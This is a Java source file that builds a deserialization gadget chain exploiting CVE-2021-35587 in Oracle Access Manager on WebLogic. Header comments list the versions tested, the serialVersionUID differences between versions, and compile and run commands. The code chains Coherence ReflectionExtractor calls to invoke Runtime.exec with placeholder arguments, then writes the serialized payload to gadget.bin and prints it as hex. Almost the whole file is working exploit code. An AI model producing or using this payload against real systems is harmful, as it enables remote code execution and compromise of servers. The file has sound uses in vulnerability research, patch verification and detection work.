// This gadget chain targets Oracle Access Manager on WebLogic (CVE-2021-35587) and is based upon:
// * Y4er: https://github.com/Y4er/CVE-2020-2883/blob/master/CVE_2020_2883.java
// * Jang: https://twitter.com/testanull/status/1502114473989279744
//
// Tested against Oracle Access Manager version:
// * 12.2.1.4.0
// * 12.2.1.3.0
//
// Note: The classes used in this chain do not have a serialVersionUID explicitly defined, so the JVM will compute one.
// This has the effect that if the class changes between versions, the computed serialVersionUID will differ between
// versions. As such we need to account for this, and generate the gadget for the different versions.
//
// We collect these JAR files from the OAM install (actually part of the WebLogic application server).
// $ sha1sum **/*
// 6de9309c3bcbc0478da85a8f60325c4ee5419cf1  12.2.1.3.0/coherence.jar
// d58cf115884e1ae76fb0e7b8e022f7447af63a66  12.2.1.3.0/com.bea.core.weblogic.rmi.client.jar
// ba45c235668885dff671eff34ee1b6ca57aefa6a  12.2.1.4.0/coherence.jar
// d3f2e0778774123ae19654ad0960600bddf79389  12.2.1.4.0/com.bea.core.weblogic.rmi.client.jar
//
// We can see the serialVersionUID changes for the classes in coherence.jar, for example:
// $ serialver -classpath 12.2.1.3.0/coherence.jar com.tangosol.util.comparator.ExtractorComparator
// com.tangosol.util.comparator.ExtractorComparator:    private static final long serialVersionUID = -339238653537079588L;
// $ serialver -classpath 12.2.1.4.0/coherence.jar com.tangosol.util.comparator.ExtractorComparator
// com.tangosol.util.comparator.ExtractorComparator:    private static final long serialVersionUID = -453812047863165663L;
//
// We can see the serialVersionUID does not change for BasicServiceContext:
// $ serialver -classpath 12.2.1.3.0/com.bea.core.weblogic.rmi.client.jar weblogic.rmi.provider.BasicServiceContext
// weblogic.rmi.provider.BasicServiceContext:    private static final long serialVersionUID = -1989708991725000930L;
// $ serialver -classpath 12.2.1.4.0/com.bea.core.weblogic.rmi.client.jar weblogic.rmi.provider.BasicServiceContext
// weblogic.rmi.provider.BasicServiceContext:    private static final long serialVersionUID = -1989708991725000930L;
//
// Compile with:
// $ javac -cp 12.2.1.4.0/coherence.jar:12.2.1.4.0/com.bea.core.weblogic.rmi.client.jar gadget.java
//
// Run with:
// $ java --add-opens java.base/java.util=ALL-UNNAMED -cp 12.2.1.4.0/coherence.jar:12.2.1.4.0/com.bea.core.weblogic.rmi.client.jar:. gadget
//
// Save the output for that version:
// $ mv gadget.bin gadget_12.2.1.4.0.bin
//
// We then get the following gadget chains:
// $ sha1sum *.bin
// 1326ef6fe634e2e2bb83705507d766efbfcfc141  gadget_12.2.1.3.0.bin
// fad1e1e243dd9aca09658893737341008ef27096  gadget_12.2.1.4.0.bin
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

// coherence.jar
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

// com.bea.core.weblogic.rmi.client.jar
import weblogic.rmi.provider.BasicServiceContext;

public class gadget {

    public static void main(String[] args) throws Exception
    {
        ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[]{}});
        ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[]{}});
        ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"EXEC_ARG0", "EXEC_ARG1", "EXEC_ARG2"}});

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                reflectionExtractor1,
                reflectionExtractor2,
                reflectionExtractor3,
        };

        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, valueExtractors);

        Field field = PriorityQueue.class.getDeclaredField("queue");
        field.setAccessible(true);

        Object[] queueArray = (Object[]) field.get(queue);

        queueArray[0] = Runtime.class;
        queueArray[1] = "1";

        BasicServiceContext bsc = new BasicServiceContext(1, queue, false);

        byte[] bytes = serialize(bsc);
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        System.out.println(sb.toString());

		FileOutputStream fos = new FileOutputStream("gadget.bin");
		ObjectOutputStream os = new ObjectOutputStream(fos);
		os.writeObject(bsc);
		os.close();

        //deserialize(bytes);
    }

    public static byte[] serialize(final Object obj) throws IOException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        serialize(obj, out);
        return out.toByteArray();
    }

    public static void serialize(final Object obj, final OutputStream out) throws IOException {
        final ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        objOut.flush();
        objOut.close();
    }

    public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        final ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        return deserialize(in);
    }

    public static Object deserialize(final InputStream in) throws ClassNotFoundException, IOException {
        final ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }

}